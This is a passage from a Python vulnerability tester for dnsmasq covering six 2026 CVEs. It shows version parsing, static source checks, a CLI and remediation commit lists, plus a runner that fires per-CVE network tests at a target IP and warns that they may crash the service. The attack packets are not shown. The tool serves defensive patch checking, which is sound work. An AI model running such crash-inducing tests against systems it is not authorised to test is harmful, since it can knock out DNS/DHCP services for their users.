                if "dnsmasq" in line.lower() and "version" in line.lower():
                    # Extract version number
                    parts = line.split()
                    for i, p in enumerate(parts):
                        if p.lower() == "version":
                            if i + 1 < len(parts):
                                return parts[i + 1], None
                    # Try "dnsmasq-X.YZ"
                    for p in parts:
                        if p.startswith("dnsmasq-"):
                            return p.replace("dnsmasq-", ""), None
            return None, f"Could not parse version from output: {output[:200]}"
        except FileNotFoundError:
            return None, "Binary not executable (cross-compiled for different arch?)"
        except Exception as e:
            return None, str(e)

    @classmethod
    def check_source_version(cls, source_dir):
        """Extract version from source CHANGELOG or dnsmasq.h."""
        changelog = os.path.join(source_dir, "CHANGELOG")
        if os.path.exists(changelog):
            with open(changelog, "r") as f:
                first_line = f.readline()
            # Usually starts with "version X.YZ"
            if "version" in first_line.lower():
                parts = first_line.split()
                for i, p in enumerate(parts):
                    if p.lower() == "version":
                        if i + 1 < len(parts):
                            return parts[i + 1].rstrip("."), None

        # Try Makefile
        makefile = os.path.join(source_dir, "Makefile")
        if os.path.exists(makefile):
            with open(makefile, "r") as f:
                for line in f:
                    if "VERSION" in line and "=" in line:
                        ver = line.split("=")[1].strip()
                        if ver and ver[0].isdigit():
                            return ver, None

        return None, "Could not determine version from source"


# ============================================================================
# Main
# ============================================================================

def print_banner():
    print(f"""
{BOLD}{'='*70}
  dnsmasq CVE-2026 Vulnerability Test Suite
  Tests: CVE-2026-2291, 4890, 4891, 4892, 4893, 5172
  Fix version: 2.92rel2 (released 2026-05-11)
{'='*70}{RESET}
""")


def print_result(result):
    cve = result["cve"]
    vuln = result.get("vulnerable", False)
    details = result.get("details", "")

    if vuln:
        status = f"{RED}VULNERABLE{RESET}"
    elif "PATCHED" in details.upper():
        status = f"{GREEN}PATCHED{RESET}"
    elif "N/A" in details.upper() or "not applicable" in details.lower():
        status = f"{BLUE}N/A{RESET}"
    else:
        status = f"{YELLOW}INCONCLUSIVE{RESET}"

    print(f"  [{status}] {BOLD}{cve}{RESET}")
    print(f"           {details}")
    print()


def run_network_tests(target, port, timeout, test_filter):
    print(f"\n{BOLD}[NETWORK TESTS] Target: {target}:{port}{RESET}")
    print(f"{'─'*60}")

    tests = [
        CVE_2026_2291,
        CVE_2026_5172,
        CVE_2026_4890,
        CVE_2026_4891,
        CVE_2026_4892,
        CVE_2026_4893,
    ]

    results = []
    for test_class in tests:
        if test_filter != "all" and test_filter.upper() != test_class.CVE_ID.upper():
            continue

        print(f"\n  Testing {test_class.CVE_ID}: {test_class.DESCRIPTION}")
        print(f"  Severity: {test_class.SEVERITY}")
        print(f"  {'·'*50}")

        if test_class == CVE_2026_4892:
            result = test_class.test(target, port=547, timeout=timeout)
        else:
            result = test_class.test(target, port, timeout=timeout)

        results.append(result)
        print_result(result)

        # If dnsmasq crashed, warn and optionally stop
        if result.get("vulnerable") and "CRASH" in result.get("details", "").upper():
            print(f"  {RED}⚠ WARNING: dnsmasq appears to have crashed!{RESET}")
            print(f"  {RED}  Subsequent tests may fail. Restart dnsmasq to continue.{RESET}")
            if not check_dns_alive(target, port, 3):
                print(f"\n  {RED}dnsmasq is down. Stopping further tests.{RESET}")
                break

    return results


def run_static_analysis(source_dirs):
    print(f"\n{BOLD}[STATIC SOURCE ANALYSIS]{RESET}")
    print(f"{'─'*60}")

    for source_dir in source_dirs:
        src_path = os.path.join(source_dir, "src")
        if not os.path.exists(src_path):
            # Try without src/ prefix
            if os.path.exists(os.path.join(source_dir, "dnsmasq.h")):
                src_path = source_dir
                source_dir = os.path.dirname(source_dir)
            else:
                print(f"\n  {YELLOW}Skipping {source_dir} - no src/ directory found{RESET}")
                continue

        # Get version
        version, err = VersionChecker.check_source_version(source_dir)
        if version:
            is_vuln = VersionChecker.is_vulnerable(version)
            status = f"{RED}VULNERABLE{RESET}" if is_vuln else f"{GREEN}FIXED{RESET}"
            print(f"\n  Source: {source_dir}")
            print(f"  Version: {BOLD}{version}{RESET} [{status}] (fix: 2.92rel2)")
        else:
            print(f"\n  Source: {source_dir}")
            print(f"  Version: {YELLOW}unknown{RESET} ({err})")

        # Run static checks
        results = StaticAnalyzer.check_source(source_dir)
        for cve, status_str, detail in results:
            if "VULNERABLE" in status_str:
                color = RED
            elif "PATCHED" in status_str:
                color = GREEN
            elif "N/A" in status_str:
                color = BLUE
            else:
                color = YELLOW
            print(f"    [{color}{status_str}{RESET}] {cve}: {detail}")

    print()


def run_version_check(binary_paths):
    print(f"\n{BOLD}[VERSION CHECK]{RESET}")
    print(f"{'─'*60}")

    for binary_path in binary_paths:
        version, err = VersionChecker.check_binary(binary_path)
        if version:
            is_vuln = VersionChecker.is_vulnerable(version)
            status = f"{RED}VULNERABLE{RESET}" if is_vuln else f"{GREEN}FIXED{RESET}"
            print(f"  {binary_path}")
            print(f"    Version: {BOLD}{version}{RESET} [{status}]")
            if is_vuln:
                print(f"    {RED}→ Upgrade to 2.92rel2 or apply CVE patches{RESET}")
        else:
            print(f"  {binary_path}")
            print(f"    {YELLOW}{err}{RESET}")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="dnsmasq CVE-2026 Vulnerability Tester",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Network test against running dnsmasq
  python3 dnsmasq_cve_tester.py --target 192.168.1.1

  # Test specific CVE only
  python3 dnsmasq_cve_tester.py --target 192.168.1.1 --test CVE-2026-2291

  # Static source code analysis (no network needed)
  python3 dnsmasq_cve_tester.py --source /path/to/dnsmasq-2.90/

  # Check binary version
  python3 dnsmasq_cve_tester.py --binary /usr/sbin/dnsmasq

  # Full analysis (network + source + binary)
  python3 dnsmasq_cve_tester.py --target 192.168.1.1 \\
    --source /path/to/dnsmasq-src/ \\
    --binary /path/to/dnsmasq

  # Analyze your Oak/Pinnacle builds
  python3 dnsmasq_cve_tester.py \\
    --source /home/user/code/Main_Oak/products/oak/output/release/dnsmasq/build/dnsmasq-2.78 \\
    --source /home/user/code/pinnacle/develop_46_2.2/store/sdk/qsdk/build_dir/target-arm/dnsmasq-nodhcpv6/dnsmasq-2.90
        """
    )

    parser.add_argument("--target", "-t", help="Target IP address running dnsmasq")
    parser.add_argument("--port", "-p", type=int, default=53, help="DNS port (default: 53)")
    parser.add_argument("--timeout", type=int, default=5, help="Timeout in seconds (default: 5)")
    parser.add_argument("--test", default="all",
                        help="Test specific CVE (e.g., CVE-2026-2291) or 'all'")
    parser.add_argument("--source", action="append", default=[],
                        help="Path to dnsmasq source directory for static analysis (repeatable)")
    parser.add_argument("--binary", action="append", default=[],
                        help="Path to dnsmasq binary for version check (repeatable)")
    parser.add_argument("--no-network", action="store_true",
                        help="Skip network tests (source/binary analysis only)")

    args = parser.parse_args()

    if not args.target and not args.source and not args.binary:
        parser.print_help()
        print(f"\n{RED}Error: Specify at least --target, --source, or --binary{RESET}")
        sys.exit(1)

    print_banner()

    # Version check
    if args.binary:
        run_version_check(args.binary)

    # Static analysis
    if args.source:
        run_static_analysis(args.source)

    # Network tests
    if args.target and not args.no_network:
        if os.geteuid() != 0:
            print(f"  {YELLOW}Note: Running without root. Some tests (DHCPv6) may be limited.{RESET}")
            print(f"  {YELLOW}For full testing: sudo python3 {sys.argv[0]} ...{RESET}\n")
        run_network_tests(args.target, args.port, args.timeout, args.test)

    # Summary
    print(f"\n{'='*70}")
    print(f"{BOLD}REMEDIATION:{RESET}")
    print(f"  1. Upgrade dnsmasq to 2.92rel2+ (https://thekelleys.org.uk/dnsmasq/)")
    print(f"  2. Or backport patches from: https://thekelleys.org.uk/dnsmasq/CVE/")
    print(f"  3. Key commits:")
    print(f"     CVE-2026-2291: ec2fbfbbdaa7d7db1c707dce26ce1a37cfe09660")
    print(f"     CVE-2026-4890: de76f21e115c451cf0653790fc4b209cd4778a07 (for ≤2.91)")
    print(f"     CVE-2026-4891: 2cacea42e4d45717bd0ce3ccfe8e78960245e5da")
    print(f"     CVE-2026-4892: 011a36c51438c986535a7248ed2e7f424f8e1078")
    print(f"     CVE-2026-4893: 434d68f2eb1a58744470698483a3ae09b5a9a870")
    print(f"     CVE-2026-5172: fa3c8ddef6712b52f562813317e6a997e1210123")
    print(f"{'='*70}\n")


if __name__ == "__main__":
    main()
